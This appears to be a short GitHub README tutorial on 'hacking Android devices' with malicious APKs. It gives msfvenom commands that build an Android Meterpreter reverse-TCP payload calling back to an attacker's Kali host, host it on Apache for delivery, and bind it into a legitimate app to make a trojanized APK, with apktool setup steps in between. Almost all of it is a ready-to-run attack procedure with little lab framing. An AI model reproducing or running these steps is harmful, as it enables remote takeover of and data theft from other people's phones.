# Hacking-Android-Devices
Hacking Android Devices using malicious APK's

1st creating a simple malicious apk file using msfvenom
<pre>msfvenom -p android/meterpreter/reverse_tcp LHOST=kali_ip LPORT=2222 -o /root/malicious.apk</pre>

Send the file to the mobile or android lab using
<pre>mv malicious.apk /var/www/html/</pre>
<pre>service apache2 start</pre>
<pre>service apaceh2 status</pre>

-----------------------------------------------------------------
2nd Bind the payload in the legitimate android app using APKTOOl

Pre-requisites/ Libraries
Check if the APKTOOL version contains DIRTY
<pre>apktool --version</pre>
If it contains DIRTY in the version then remove it
<pre>apt remove apktool</pre>
Then follow next steps:
<pre>apt update</pre>
<pre>apt install zipalign</pre>
<pre>apt install default-jdk</pre>
<pre>apt install default-jre</pre>
<pre>apt install jarsigner</pre>
<pre>apt install apksigner</pre>
<pre>apt install libcurses5</pre>
<pre>apt install libncurses6</pre>
<pre>apt install lib32z1</pre>
<pre>apt install lib32stdc++6</pre>
Once all the above is done. reboot Kali Linux
<pre>reboot</pre>
After rebooting
go to browser
<pre>apktool.org</pre>
Then INSTALL > under Linux > click WRAPPER SCRIPT > Copy and paste the code in an EMPTY file on KALI LINUX Desktop and name it APKTOOL.<br>
Then click LATEST VERSION of apktool > Download which ever is the latest version of apktool_2.12.2.jar<br>
After downloading rename apktool_2.12.2.jar to apktool.jar<br>
Move both files to this directory
<pre>mv apktool apktool.jar /usr/local/bin/</pre>
Give executable permissions to apktool<br>
<pre>chmod +x apktool</pre>
Check the APKTOOL version now
<pre>apktool --version</pre>
Once you get the response like: 2.12.2<br>
<pre>msfvenom -x ORIGINAL.apk -p android/meterpreter/reverse_tcp LHOST=Kali_ip LPORT=2222 -o /root/binded.apk</pre>

